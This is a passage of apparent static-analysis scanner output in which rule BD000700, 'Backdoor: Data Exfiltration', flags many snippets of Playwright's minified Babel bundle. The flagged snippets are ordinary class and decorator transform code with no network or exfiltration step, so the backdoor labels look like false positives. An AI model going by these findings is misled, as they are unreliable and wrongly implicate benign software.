                    "text": "..oe];let je=[],M=A.types.newExpression(ee,[]);fe.length>0&&je.push(...fe),An&&(fn=!0,je.push(An)),je.length>0?(je.unshift(A.types.callExpression(A.types.super(),[A.types.cloneNode(Be)])),ee.body.body.push(JO(je,!1))):M.arguments.push(A.types.cloneNode(Be));let[$]=e.replaceWith(M);Ma=$.get(\"callee\").get(\"body\").get(\"body\")[0].get(\"key\")}}!fn&&An&&e.node.body.body.push(A.types.staticBlock([A.types.expressionStatement(An)]));let{superClass:Cn}=Rs;if(Cn&&(a===\"2023-11\"||a===\"2023-05\")){let oe=e.scope.maybeGenerateMemoised(Cn);oe&&(Rs.superClass=A.types.assignmentExpression(\"=\",oe,Cn),Cn=oe)}let Us=A.t",
                    "rendered": {
                      "text": "..oe];let je=[],M=A.types.newExpression(ee,[]);fe.length>0&&je.push(...fe),An&&(fn=!0,je.push(An)),je.length>0?(je.unshift(A.types.callExpression(A.types.super(),[A.types.cloneNode(Be)])),ee.body.body.push(JO(je,!1))):M.arguments.push(A.types.cloneNode(Be));let[$]=e.replaceWith(M);Ma=$.get(\"callee\").get(\"body\").get(\"body\")[0].get(\"key\")}}!fn&&An&&e.node.body.body.push(A.types.staticBlock([A.types.expressionStatement(An)]));let{superClass:Cn}=Rs;if(Cn&&(a===\"2023-11\"||a===\"2023-05\")){let oe=e.scope.maybeGenerateMemoised(Cn);oe&&(Rs.superClass=A.types.assignmentExpression(\"=\",oe,Cn),Cn=oe)}let Us=A.t",
                      "markdown": "`..oe];let je=[],M=A.types.newExpression(ee,[]);fe.length>0&&je.push(...fe),An&&(fn=!0,je.push(An)),je.length>0?(je.unshift(A.types.callExpression(A.types.super(),[A.types.cloneNode(Be)])),ee.body.body.push(JO(je,!1))):M.arguments.push(A.types.cloneNode(Be));let[$]=e.replaceWith(M);Ma=$.get(\"callee\").get(\"body\").get(\"body\")[0].get(\"key\")}}!fn&&An&&e.node.body.body.push(A.types.staticBlock([A.types.expressionStatement(An)]));let{superClass:Cn}=Rs;if(Cn&&(a===\"2023-11\"||a===\"2023-05\")){let oe=e.scope.maybeGenerateMemoised(Cn);oe&&(Rs.superClass=A.types.assignmentExpression(\"=\",oe,Cn),Cn=oe)}let Us=A.t`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1867,
                  "startColumn": 384,
                  "endLine": 1867,
                  "endColumn": 389,
                  "snippet": {
                    "text": "oid 0,!0,!0),...oe];let je=[],M=A.types.newExpression(ee,[]);fe.length>0&&je.push(...fe),An&&(fn=!0,je.push(An)),je.length>0?(je.unshift(A.types.callExpression(A.types.super(),[A.types.cloneNode(Be)])),ee.body.body.push(JO(je,!1))):M.arguments.push(A.types.cloneNode(Be));let[$]=e.replaceWith(M);Ma=$.get(\"callee\").get(\"body\").get(\"body\")[0].get(\"key\")}}!fn&&An&&e.node.body.body.push(A.types.staticBlock([A.types.expressionStatement(An)]));let{superClass:Cn}=Rs;if(Cn&&(a===\"2023-11\"||a===\"2023-05\")){let oe=e.scope.maybeGenerateMemoised(Cn);oe&&(Rs.superClass=A.types.assignmentExpression(\"=\",oe,Cn),Cn=",
                    "rendered": {
                      "text": "oid 0,!0,!0),...oe];let je=[],M=A.types.newExpression(ee,[]);fe.length>0&&je.push(...fe),An&&(fn=!0,je.push(An)),je.length>0?(je.unshift(A.types.callExpression(A.types.super(),[A.types.cloneNode(Be)])),ee.body.body.push(JO(je,!1))):M.arguments.push(A.types.cloneNode(Be));let[$]=e.replaceWith(M);Ma=$.get(\"callee\").get(\"body\").get(\"body\")[0].get(\"key\")}}!fn&&An&&e.node.body.body.push(A.types.staticBlock([A.types.expressionStatement(An)]));let{superClass:Cn}=Rs;if(Cn&&(a===\"2023-11\"||a===\"2023-05\")){let oe=e.scope.maybeGenerateMemoised(Cn);oe&&(Rs.superClass=A.types.assignmentExpression(\"=\",oe,Cn),Cn=",
                      "markdown": "`oid 0,!0,!0),...oe];let je=[],M=A.types.newExpression(ee,[]);fe.length>0&&je.push(...fe),An&&(fn=!0,je.push(An)),je.length>0?(je.unshift(A.types.callExpression(A.types.super(),[A.types.cloneNode(Be)])),ee.body.body.push(JO(je,!1))):M.arguments.push(A.types.cloneNode(Be));let[$]=e.replaceWith(M);Ma=$.get(\"callee\").get(\"body\").get(\"body\")[0].get(\"key\")}}!fn&&An&&e.node.body.body.push(A.types.staticBlock([A.types.expressionStatement(An)]));let{superClass:Cn}=Rs;if(Cn&&(a===\"2023-11\"||a===\"2023-05\")){let oe=e.scope.maybeGenerateMemoised(Cn);oe&&(Rs.superClass=A.types.assignmentExpression(\"=\",oe,Cn),Cn=`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1865,
                  "startColumn": 13783,
                  "endLine": 1865,
                  "endColumn": 13788,
                  "snippet": {
                    "text": "pression()]))}fe.length>0&&(CE(fe,ee),fe=[]),ee.node.static=!1,oe.push(ee.node),ee.remove()}else if(ee.isClassPrivateMethod({static:!0})){if(DE(ee,F)){new WO.default({constantSuper:r,methodPath:ee,objectRef:Be,superRef:e.node.superClass,file:t.file,refToPreserve:Be}).replace();let M=v(ZO(ee.node),ee.get(\"key.id\").node.name,qs);n?(ee.node.params=[A.types.restElement(A.types.identifier(\"arg\"))],ee.node.body=A.types.blockStatement([A.types.returnStatement(A.types.callExpression(A.types.memberExpression(M,A.types.identifier(\"apply\")),[A.types.thisExpression(),A.types.identifier(\"arg\")]))])):(ee.node.pa",
                    "rendered": {
                      "text": "pression()]))}fe.length>0&&(CE(fe,ee),fe=[]),ee.node.static=!1,oe.push(ee.node),ee.remove()}else if(ee.isClassPrivateMethod({static:!0})){if(DE(ee,F)){new WO.default({constantSuper:r,methodPath:ee,objectRef:Be,superRef:e.node.superClass,file:t.file,refToPreserve:Be}).replace();let M=v(ZO(ee.node),ee.get(\"key.id\").node.name,qs);n?(ee.node.params=[A.types.restElement(A.types.identifier(\"arg\"))],ee.node.body=A.types.blockStatement([A.types.returnStatement(A.types.callExpression(A.types.memberExpression(M,A.types.identifier(\"apply\")),[A.types.thisExpression(),A.types.identifier(\"arg\")]))])):(ee.node.pa",
                      "markdown": "`pression()]))}fe.length>0&&(CE(fe,ee),fe=[]),ee.node.static=!1,oe.push(ee.node),ee.remove()}else if(ee.isClassPrivateMethod({static:!0})){if(DE(ee,F)){new WO.default({constantSuper:r,methodPath:ee,objectRef:Be,superRef:e.node.superClass,file:t.file,refToPreserve:Be}).replace();let M=v(ZO(ee.node),ee.get(\"key.id\").node.name,qs);n?(ee.node.params=[A.types.restElement(A.types.identifier(\"arg\"))],ee.node.body=A.types.blockStatement([A.types.returnStatement(A.types.callExpression(A.types.memberExpression(M,A.types.identifier(\"apply\")),[A.types.thisExpression(),A.types.identifier(\"arg\")]))])):(ee.node.pa`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1865,
                  "startColumn": 13310,
                  "endLine": 1865,
                  "endColumn": 13315,
                  "snippet": {
                    "text": "()){if(DE(ee,F)){let je=v(mEe(ee.node),\"staticBlock\",qs);fe.push(A.types.callExpression(A.types.memberExpression(je,A.types.identifier(\"call\")),[A.types.thisExpression()]))}else fe.push(hEe(ee.node));ee.remove();return}if((ee.isClassProperty()||ee.isClassPrivateProperty())&&ee.node.static){let je=ee.get(\"value\");if(DE(je,F)){let M=v(yEe(je.node),\"fieldValue\",qs);je.replaceWith(A.types.callExpression(A.types.memberExpression(M,A.types.identifier(\"call\")),[A.types.thisExpression()]))}fe.length>0&&(CE(fe,ee),fe=[]),ee.node.static=!1,oe.push(ee.node),ee.remove()}else if(ee.isClassPrivateMethod({static:",
                    "rendered": {
                      "text": "()){if(DE(ee,F)){let je=v(mEe(ee.node),\"staticBlock\",qs);fe.push(A.types.callExpression(A.types.memberExpression(je,A.types.identifier(\"call\")),[A.types.thisExpression()]))}else fe.push(hEe(ee.node));ee.remove();return}if((ee.isClassProperty()||ee.isClassPrivateProperty())&&ee.node.static){let je=ee.get(\"value\");if(DE(je,F)){let M=v(yEe(je.node),\"fieldValue\",qs);je.replaceWith(A.types.callExpression(A.types.memberExpression(M,A.types.identifier(\"call\")),[A.types.thisExpression()]))}fe.length>0&&(CE(fe,ee),fe=[]),ee.node.static=!1,oe.push(ee.node),ee.remove()}else if(ee.isClassPrivateMethod({static:",
                      "markdown": "`()){if(DE(ee,F)){let je=v(mEe(ee.node),\"staticBlock\",qs);fe.push(A.types.callExpression(A.types.memberExpression(je,A.types.identifier(\"call\")),[A.types.thisExpression()]))}else fe.push(hEe(ee.node));ee.remove();return}if((ee.isClassProperty()||ee.isClassPrivateProperty())&&ee.node.static){let je=ee.get(\"value\");if(DE(je,F)){let M=v(yEe(je.node),\"fieldValue\",qs);je.replaceWith(A.types.callExpression(A.types.memberExpression(M,A.types.identifier(\"call\")),[A.types.thisExpression()]))}fe.length>0&&(CE(fe,ee),fe=[]),ee.node.static=!1,oe.push(ee.node),ee.remove()}else if(ee.isClassPrivateMethod({static:`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1865,
                  "startColumn": 12960,
                  "endLine": 1865,
                  "endColumn": 12965,
                  "snippet": {
                    "text": ".body.body.unshift(JO(Ge,oe)),Ge=[]}fe.length>0&&(e.node.body.body.push(nEe(fe)),fe=[]);let Qe=uEe(te),It=cEe(a===\"2023-11\"?te:Qe,a),Rt=fEe(Qe);I&&Rt.push(I),D&&Rt.push(D);let Pr=[],fn=!1,An=Pe&&A.types.callExpression(A.types.cloneNode(Pe),[]),Ma=e,Rs=e.node,qs=[];if(c){Pr.push(Be,Pe);let oe=[];if(e.get(\"body.body\").forEach(ee=>{if(ee.isStaticBlock()){if(DE(ee,F)){let je=v(mEe(ee.node),\"staticBlock\",qs);fe.push(A.types.callExpression(A.types.memberExpression(je,A.types.identifier(\"call\")),[A.types.thisExpression()]))}else fe.push(hEe(ee.node));ee.remove();return}if((ee.isClassProperty()||ee.isClass",
                    "rendered": {
                      "text": ".body.body.unshift(JO(Ge,oe)),Ge=[]}fe.length>0&&(e.node.body.body.push(nEe(fe)),fe=[]);let Qe=uEe(te),It=cEe(a===\"2023-11\"?te:Qe,a),Rt=fEe(Qe);I&&Rt.push(I),D&&Rt.push(D);let Pr=[],fn=!1,An=Pe&&A.types.callExpression(A.types.cloneNode(Pe),[]),Ma=e,Rs=e.node,qs=[];if(c){Pr.push(Be,Pe);let oe=[];if(e.get(\"body.body\").forEach(ee=>{if(ee.isStaticBlock()){if(DE(ee,F)){let je=v(mEe(ee.node),\"staticBlock\",qs);fe.push(A.types.callExpression(A.types.memberExpression(je,A.types.identifier(\"call\")),[A.types.thisExpression()]))}else fe.push(hEe(ee.node));ee.remove();return}if((ee.isClassProperty()||ee.isClass",
                      "markdown": "`.body.body.unshift(JO(Ge,oe)),Ge=[]}fe.length>0&&(e.node.body.body.push(nEe(fe)),fe=[]);let Qe=uEe(te),It=cEe(a===\"2023-11\"?te:Qe,a),Rt=fEe(Qe);I&&Rt.push(I),D&&Rt.push(D);let Pr=[],fn=!1,An=Pe&&A.types.callExpression(A.types.cloneNode(Pe),[]),Ma=e,Rs=e.node,qs=[];if(c){Pr.push(Be,Pe);let oe=[];if(e.get(\"body.body\").forEach(ee=>{if(ee.isStaticBlock()){if(DE(ee,F)){let je=v(mEe(ee.node),\"staticBlock\",qs);fe.push(A.types.callExpression(A.types.memberExpression(je,A.types.identifier(\"call\")),[A.types.thisExpression()]))}else fe.push(hEe(ee.node));ee.remove();return}if((ee.isClassProperty()||ee.isClass`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1865,
                  "startColumn": 12393,
                  "endLine": 1865,
                  "endColumn": 12398,
                  "snippet": {
                    "text": "==ks)&&(CE(Ge,oe),Ge=[]),fe.length>0&&_e&&(we===Ti||we===ks)&&(CE(fe,oe),fe=[]),M&&a===\"2023-11\"&&(we===Ti||we===ks)){let vt=_r(y,`init_extra_${W}`);nt.push(vt);let Je=A.types.callExpression(A.types.cloneNode(vt),_e?[]:[A.types.thisExpression()]);_e?fe.push(Je):Ge.push(Je)}}}if(pe.length>0){let oe=e.get(\"body.body\"),ee;for(let je=oe.length-1;je>=0;je--){let M=oe[je],$=M.node;if($.computed){if(c&&A.types.isClassProperty($,{static:!0}))continue;ee=M;break}}ee!=null&&(Qbe(pe,ee),pe=[])}if(Ge.length>0){let oe=!!e.node.superClass;se?oe?rEe(Ge,se,I):eEe(Ge,se):e.node.body.body.unshift(JO(Ge,oe)),Ge=[]}fe",
                    "rendered": {
                      "text": "==ks)&&(CE(Ge,oe),Ge=[]),fe.length>0&&_e&&(we===Ti||we===ks)&&(CE(fe,oe),fe=[]),M&&a===\"2023-11\"&&(we===Ti||we===ks)){let vt=_r(y,`init_extra_${W}`);nt.push(vt);let Je=A.types.callExpression(A.types.cloneNode(vt),_e?[]:[A.types.thisExpression()]);_e?fe.push(Je):Ge.push(Je)}}}if(pe.length>0){let oe=e.get(\"body.body\"),ee;for(let je=oe.length-1;je>=0;je--){let M=oe[je],$=M.node;if($.computed){if(c&&A.types.isClassProperty($,{static:!0}))continue;ee=M;break}}ee!=null&&(Qbe(pe,ee),pe=[])}if(Ge.length>0){let oe=!!e.node.superClass;se?oe?rEe(Ge,se,I):eEe(Ge,se):e.node.body.body.unshift(JO(Ge,oe)),Ge=[]}fe",
                      "markdown": "`==ks)&&(CE(Ge,oe),Ge=[]),fe.length>0&&_e&&(we===Ti||we===ks)&&(CE(fe,oe),fe=[]),M&&a===\"2023-11\"&&(we===Ti||we===ks)){let vt=_r(y,`init_extra_${W}`);nt.push(vt);let Je=A.types.callExpression(A.types.cloneNode(vt),_e?[]:[A.types.thisExpression()]);_e?fe.push(Je):Ge.push(Je)}}}if(pe.length>0){let oe=e.get(\"body.body\"),ee;for(let je=oe.length-1;je>=0;je--){let M=oe[je],$=M.node;if($.computed){if(c&&A.types.isClassProperty($,{static:!0}))continue;ee=M;break}}ee!=null&&(Qbe(pe,ee),pe=[])}if(Ge.length>0){let oe=!!e.node.superClass;se?oe?rEe(Ge,se,I):eEe(Ge,se):e.node.body.body.unshift(JO(Ge,oe)),Ge=[]}fe`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1865,
                  "startColumn": 11225,
                  "endLine": 1865,
                  "endColumn": 11230,
                  "snippet": {
                    "text": "ith(ns);if(Re){vt=YO(Ot,a);let lr=_r(y,`get_${W}`),Di=_r(y,`set_${W}`);pEe(a,wi,le,lr,Di,_e),nt=[Ar,lr,Di]}else HO(e.node.id,wi,A.types.cloneNode(le),A.types.isAssignmentExpression(le)?A.types.cloneNode(le.left):A.types.cloneNode(le),Ot,$,_e,a),nt=[Ar]}else if(we===Ti){let st=_r(y,`init_${W}`),xt=oe.get(\"value\"),Ot=a===\"2023-11\"&&_e?[]:[A.types.thisExpression()];xt.node&&Ot.push(xt.node),xt.replaceWith(A.types.callExpression(A.types.cloneNode(st),Ot)),nt=[st],Re&&(vt=YO(le,a))}else if(Re){let st=_r(y,`call_${W}`);if(nt=[st],new WO.default({constantSuper:r,methodPath:oe,objectRef:Be,superRef:e.node.",
                    "rendered": {
                      "text": "ith(ns);if(Re){vt=YO(Ot,a);let lr=_r(y,`get_${W}`),Di=_r(y,`set_${W}`);pEe(a,wi,le,lr,Di,_e),nt=[Ar,lr,Di]}else HO(e.node.id,wi,A.types.cloneNode(le),A.types.isAssignmentExpression(le)?A.types.cloneNode(le.left):A.types.cloneNode(le),Ot,$,_e,a),nt=[Ar]}else if(we===Ti){let st=_r(y,`init_${W}`),xt=oe.get(\"value\"),Ot=a===\"2023-11\"&&_e?[]:[A.types.thisExpression()];xt.node&&Ot.push(xt.node),xt.replaceWith(A.types.callExpression(A.types.cloneNode(st),Ot)),nt=[st],Re&&(vt=YO(le,a))}else if(Re){let st=_r(y,`call_${W}`);if(nt=[st],new WO.default({constantSuper:r,methodPath:oe,objectRef:Be,superRef:e.node.",
                      "markdown": "`ith(ns);if(Re){vt=YO(Ot,a);let lr=_r(y,`get_${W}`),Di=_r(y,`set_${W}`);pEe(a,wi,le,lr,Di,_e),nt=[Ar,lr,Di]}else HO(e.node.id,wi,A.types.cloneNode(le),A.types.isAssignmentExpression(le)?A.types.cloneNode(le.left):A.types.cloneNode(le),Ot,$,_e,a),nt=[Ar]}else if(we===Ti){let st=_r(y,`init_${W}`),xt=oe.get(\"value\"),Ot=a===\"2023-11\"&&_e?[]:[A.types.thisExpression()];xt.node&&Ot.push(xt.node),xt.replaceWith(A.types.callExpression(A.types.cloneNode(st),Ot)),nt=[st],Re&&(vt=YO(le,a))}else if(Re){let st=_r(y,`call_${W}`);if(nt=[st],new WO.default({constantSuper:r,methodPath:oe,objectRef:Be,superRef:e.node.`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1865,
                  "startColumn": 10536,
                  "endLine": 1865,
                  "endColumn": 10541,
                  "snippet": {
                    "text": "operty({static:!0})?(ee.key=A.types.cloneNode(Je.left),pe.push(Je)):ee.key=Je)}let{key:le,static:_e}=ee,Re=le.type===\"PrivateName\",we=lEe(oe);Re&&!_e&&(M&&(qe=!0),(A.types.isClassPrivateProperty(ee)||!Fe)&&(Fe=le)),oe.isClassMethod({kind:\"constructor\"})&&(se=oe);let nt;if(M){let vt,Je;if($?Je=zbe(oe.get(\"key\")):le.type===\"PrivateName\"?Je=A.types.stringLiteral(le.id.name):le.type===\"Identifier\"?Je=A.types.stringLiteral(le.name):Je=A.types.cloneNode(le),we===ks){let{value:st}=oe.node,xt=a===\"2023-11\"&&_e?[]:[A.types.thisExpression()];st&&xt.push(A.types.cloneNode(st));let Ot=b(),Ar=_r(y,`init_${W}`),",
                    "rendered": {
                      "text": "operty({static:!0})?(ee.key=A.types.cloneNode(Je.left),pe.push(Je)):ee.key=Je)}let{key:le,static:_e}=ee,Re=le.type===\"PrivateName\",we=lEe(oe);Re&&!_e&&(M&&(qe=!0),(A.types.isClassPrivateProperty(ee)||!Fe)&&(Fe=le)),oe.isClassMethod({kind:\"constructor\"})&&(se=oe);let nt;if(M){let vt,Je;if($?Je=zbe(oe.get(\"key\")):le.type===\"PrivateName\"?Je=A.types.stringLiteral(le.id.name):le.type===\"Identifier\"?Je=A.types.stringLiteral(le.name):Je=A.types.cloneNode(le),we===ks){let{value:st}=oe.node,xt=a===\"2023-11\"&&_e?[]:[A.types.thisExpression()];st&&xt.push(A.types.cloneNode(st));let Ot=b(),Ar=_r(y,`init_${W}`),",
                      "markdown": "`operty({static:!0})?(ee.key=A.types.cloneNode(Je.left),pe.push(Je)):ee.key=Je)}let{key:le,static:_e}=ee,Re=le.type===\"PrivateName\",we=lEe(oe);Re&&!_e&&(M&&(qe=!0),(A.types.isClassPrivateProperty(ee)||!Fe)&&(Fe=le)),oe.isClassMethod({kind:\"constructor\"})&&(se=oe);let nt;if(M){let vt,Je;if($?Je=zbe(oe.get(\"key\")):le.type===\"PrivateName\"?Je=A.types.stringLiteral(le.id.name):le.type===\"Identifier\"?Je=A.types.stringLiteral(le.name):Je=A.types.cloneNode(le),we===ks){let{value:st}=oe.node,xt=a===\"2023-11\"&&_e?[]:[A.types.thisExpression()];st&&xt.push(A.types.cloneNode(st));let Ot=b(),Ar=_r(y,`init_${W}`),`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1865,
                  "startColumn": 10085,
                  "endLine": 1865,
                  "endColumn": 10090,
                  "snippet": {
                    "text": "y.id.name:!$&&ee.key.type===\"Identifier\"&&(W=ee.key.name);let J,Ae;if(M){let vt=je.map(dn=>dn.expression),{hasSideEffects:Je,usesFnContext:st,decoratorsThis:xt}=j(vt),{decs:Ot,haveThis:Ar}=zO(vt,xt,a);Ae=Ar,J=Ot.length===1?Ot[0]:A.types.arrayExpression(Ot),(st||Je&&q)&&(J=v(J,W+\"Decs\",pe))}if($&&!oe.get(\"key\").isConstantExpression()){let vt=ee.key,Je=(0,tp.memoiseComputedKey)(M?IE(t,vt):vt,y,y.generateUid(\"computedKey\"));Je!=null&&(c&&oe.isClassProperty({static:!0})?(ee.key=A.types.cloneNode(Je.left),pe.push(Je)):ee.key=Je)}let{key:le,static:_e}=ee,Re=le.type===\"PrivateName\",we=lEe(oe);Re&&!_e&&(M&",
                    "rendered": {
                      "text": "y.id.name:!$&&ee.key.type===\"Identifier\"&&(W=ee.key.name);let J,Ae;if(M){let vt=je.map(dn=>dn.expression),{hasSideEffects:Je,usesFnContext:st,decoratorsThis:xt}=j(vt),{decs:Ot,haveThis:Ar}=zO(vt,xt,a);Ae=Ar,J=Ot.length===1?Ot[0]:A.types.arrayExpression(Ot),(st||Je&&q)&&(J=v(J,W+\"Decs\",pe))}if($&&!oe.get(\"key\").isConstantExpression()){let vt=ee.key,Je=(0,tp.memoiseComputedKey)(M?IE(t,vt):vt,y,y.generateUid(\"computedKey\"));Je!=null&&(c&&oe.isClassProperty({static:!0})?(ee.key=A.types.cloneNode(Je.left),pe.push(Je)):ee.key=Je)}let{key:le,static:_e}=ee,Re=le.type===\"PrivateName\",we=lEe(oe);Re&&!_e&&(M&",
                      "markdown": "`y.id.name:!$&&ee.key.type===\"Identifier\"&&(W=ee.key.name);let J,Ae;if(M){let vt=je.map(dn=>dn.expression),{hasSideEffects:Je,usesFnContext:st,decoratorsThis:xt}=j(vt),{decs:Ot,haveThis:Ar}=zO(vt,xt,a);Ae=Ar,J=Ot.length===1?Ot[0]:A.types.arrayExpression(Ot),(st||Je&&q)&&(J=v(J,W+\"Decs\",pe))}if($&&!oe.get(\"key\").isConstantExpression()){let vt=ee.key,Je=(0,tp.memoiseComputedKey)(M?IE(t,vt):vt,y,y.generateUid(\"computedKey\"));Je!=null&&(c&&oe.isClassProperty({static:!0})?(ee.key=A.types.cloneNode(Je.left),pe.push(Je)):ee.key=Je)}let{key:le,static:_e}=ee,Re=le.type===\"PrivateName\",we=lEe(oe);Re&&!_e&&(M&`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1865,
                  "startColumn": 9118,
                  "endLine": 1865,
                  "endColumn": 9123,
                  "snippet": {
                    "text": "ssion),ee=oe.some(bEe),{hasSideEffects:je,decoratorsThis:M}=j(oe),{haveThis:$,decs:W}=zO(oe,M,a);if(re=$?1:0,me=W,(je&&q||ee)&&(Se=v(A.types.arrayExpression(me),\"classDecs\",d)),!f)for(let J of e.get(\"body.body\")){let{node:Ae}=J;if(\"computed\"in Ae&&Ae.computed)if(J.isClassProperty({static:!0})){if(!J.get(\"key\").isConstantExpression()){let _e=Ae.key,Re=(0,tp.memoiseComputedKey)(_e,y,y.generateUid(\"computedKey\"));Re!=null&&(Ae.key=A.types.cloneNode(Re.left),pe.push(Re))}}else pe.length>0&&(vl(pe,J),pe=[])}}else e.node.id||(e.node.id=e.scope.generateUidIdentifier(\"Class\")),Be=A.types.cloneNode(e.node.i",
                    "rendered": {
                      "text": "ssion),ee=oe.some(bEe),{hasSideEffects:je,decoratorsThis:M}=j(oe),{haveThis:$,decs:W}=zO(oe,M,a);if(re=$?1:0,me=W,(je&&q||ee)&&(Se=v(A.types.arrayExpression(me),\"classDecs\",d)),!f)for(let J of e.get(\"body.body\")){let{node:Ae}=J;if(\"computed\"in Ae&&Ae.computed)if(J.isClassProperty({static:!0})){if(!J.get(\"key\").isConstantExpression()){let _e=Ae.key,Re=(0,tp.memoiseComputedKey)(_e,y,y.generateUid(\"computedKey\"));Re!=null&&(Ae.key=A.types.cloneNode(Re.left),pe.push(Re))}}else pe.length>0&&(vl(pe,J),pe=[])}}else e.node.id||(e.node.id=e.scope.generateUidIdentifier(\"Class\")),Be=A.types.cloneNode(e.node.i",
                      "markdown": "`ssion),ee=oe.some(bEe),{hasSideEffects:je,decoratorsThis:M}=j(oe),{haveThis:$,decs:W}=zO(oe,M,a);if(re=$?1:0,me=W,(je&&q||ee)&&(Se=v(A.types.arrayExpression(me),\"classDecs\",d)),!f)for(let J of e.get(\"body.body\")){let{node:Ae}=J;if(\"computed\"in Ae&&Ae.computed)if(J.isClassProperty({static:!0})){if(!J.get(\"key\").isConstantExpression()){let _e=Ae.key,Re=(0,tp.memoiseComputedKey)(_e,y,y.generateUid(\"computedKey\"));Re!=null&&(Ae.key=A.types.cloneNode(Re.left),pe.push(Re))}}else pe.length>0&&(vl(pe,J),pe=[])}}else e.node.id||(e.node.id=e.scope.generateUidIdentifier(\"Class\")),Be=A.types.cloneNode(e.node.i`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1865,
                  "startColumn": 9012,
                  "endLine": 1865,
                  "endColumn": 9017,
                  "snippet": {
                    "text": "nitClass\"),Y=e.isClassDeclaration(),{id:Be,path:e}=Jbe(e,s),e.node.decorators=null;let oe=c.map(J=>J.expression),ee=oe.some(bEe),{hasSideEffects:je,decoratorsThis:M}=j(oe),{haveThis:$,decs:W}=zO(oe,M,a);if(re=$?1:0,me=W,(je&&q||ee)&&(Se=v(A.types.arrayExpression(me),\"classDecs\",d)),!f)for(let J of e.get(\"body.body\")){let{node:Ae}=J;if(\"computed\"in Ae&&Ae.computed)if(J.isClassProperty({static:!0})){if(!J.get(\"key\").isConstantExpression()){let _e=Ae.key,Re=(0,tp.memoiseComputedKey)(_e,y,y.generateUid(\"computedKey\"));Re!=null&&(Ae.key=A.types.cloneNode(Re.left),pe.push(Re))}}else pe.length>0&&(vl(pe,J",
                    "rendered": {
